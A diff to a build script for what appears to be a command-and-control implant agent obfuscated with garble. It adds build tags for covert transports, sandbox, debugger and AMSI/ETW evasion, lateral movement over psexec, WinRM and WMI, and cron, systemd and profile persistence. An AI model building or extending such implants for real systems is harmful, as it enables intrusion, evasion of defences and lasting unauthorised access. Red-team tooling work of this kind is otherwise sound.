@@ -10,6 +10,16 @@ GO_VERSION="1.25.8"
 
 GARBLE_VERSION="v0.17.0"
 
+# Comma-separated Go build tags. The default prunes every optional
+# feature (WASM, Jump, persistence, extra transports) so the binary is
+# small. Set BUILD_TAGS=all for the full agent, or list individual
+# tags, e.g. BUILD_TAGS='t_http jump_psexec wasm_host'.
+BUILD_TAGS="${BUILD_TAGS:-t_http}"
+FULL_TAGS='t_http,t_dns,t_doh,t_quic,t_websocket,t_icmp,t_wireguard,tls_utls,wasm_host,feat_dotnet,feat_bof,feat_pe_loader,ev_antisanbox,ev_antidebug,ev_antivm,ev_ppid,ev_amsi,ev_etw,sleep_rc4,sleep_aes,sleep_cronos,sleep_hwbp,jump_psexec,jump_winrm,jump_wmi,jump_scshell,persist_systemd,persist_cron,persist_profile'
+if [[ "$BUILD_TAGS" == "all" ]]; then
+    BUILD_TAGS="$FULL_TAGS"
+fi
+
 # Entry points that produce a binary. One line per main package.
 # The first field is the directory under the agent module root;
 # the second is the output filename stem. A .exe suffix is
@@ -261,6 +271,15 @@ fi
 OUT_DIR="$(pwd)/$OUT_DIR_NAME"
 mkdir -p "$OUT_DIR"
 
+say "build tags: $BUILD_TAGS"
+for optional in jump_psexec jump_winrm jump_wmi jump_scshell \
+                wasm_host persist_systemd persist_cron persist_profile; do
+    case ",$BUILD_TAGS," in
+      *,"$optional",*) ;;
+      *) say "  pruned: $optional" ;;
+    esac
+done
+
 SKIP_WINDOWS="${SKIP_WINDOWS:-0}"
 
 FAILED=0
@@ -291,7 +310,7 @@ for target in "${BUILD_TARGETS[@]}"; do
         [[ "$goos" == "windows" ]] && out+=".exe"
 
         if CGO_ENABLED=0 GOOS="$goos" GOARCH="$goarch" \
-                go build -trimpath -o "$out" "./$src" ; then
+                go build -trimpath -tags "$BUILD_TAGS" -o "$out" "./$src" ; then
             size=$(stat -c %s "$out" 2>/dev/null || stat -f %z "$out")
             say "  OK  $(basename "$out")  (${size} bytes)"
         else
